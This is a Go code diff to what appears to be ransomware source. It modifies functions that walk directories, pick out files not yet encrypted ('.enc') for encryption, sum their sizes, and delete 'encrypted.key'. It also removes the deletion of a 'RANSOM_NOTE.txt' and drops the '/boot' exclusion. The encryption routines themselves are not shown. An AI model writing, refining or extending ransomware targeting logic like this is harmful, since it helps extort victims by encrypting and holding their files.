@@ -27,6 +27,14 @@ func ScanFilesInDirWithLockAdd(startDirPath string, skipHiddenDirs bool, encrypt
 				return filepath.SkipDir
 			}
 		}
+		//check if !info.IsDir() and handle error for if loop
+		_, err = os.Stat(path)
+		if err != nil {
+			if os.IsNotExist(err) {
+				// pl("Throws error: ", path)
+				return nil
+			}
+		}
 		//check if file is already encrypted
 		alreadyEncrypted := strings.HasSuffix(path, ".enc")
 		if !info.IsDir() && !alreadyEncrypted {
@@ -62,9 +70,9 @@ func ScanForEncFilesInDir(startDirPath string, skipHiddenDirs bool) []string {
 			files = append(files, path)
 		}
 
-		//remove file "encrypted.key" and "RANSOM_NOTE.txt"
+		//remove file "encrypted.key"
 		if !info.IsDir() {
-			if strings.HasSuffix(path, "encrypted.key") || strings.HasSuffix(path, "RANSOM_NOTE.txt") {
+			if strings.HasSuffix(path, "encrypted.key") {
 				os.Remove(path)
 			}
 		}
@@ -86,7 +94,7 @@ func ScanNoSideEffects(startDirPath string, skipHiddenDirs bool) ([]string, int6
 
 		if skipHiddenDirs {
 			containsHiddenPath := checkIfContainsHiddenDir(path)
-			if containsHiddenPath || strings.HasPrefix(path, "/boot") || strings.HasPrefix(path, "node_modules") {
+			if containsHiddenPath || strings.HasPrefix(path, "node_modules") {
 				return filepath.SkipDir
 			}
 		}
@@ -101,9 +109,9 @@ func ScanNoSideEffects(startDirPath string, skipHiddenDirs bool) ([]string, int6
 		}
 
 		var isOverMBLimit bool = info.Size() > 1000000*1000
-
 		//check if file ends with ".enc" and if it is a directory
-		if !info.IsDir() && !strings.HasSuffix(path, ".enc") && !isOverMBLimit {
+		var shouldWeScanFile bool = !strings.HasSuffix(path, ".enc") && !strings.HasSuffix(path, ".key") && !info.IsDir() && !isOverMBLimit
+		if shouldWeScanFile {
 			files = append(files, path)
 			sizeOfAllFiles += info.Size()
 		}
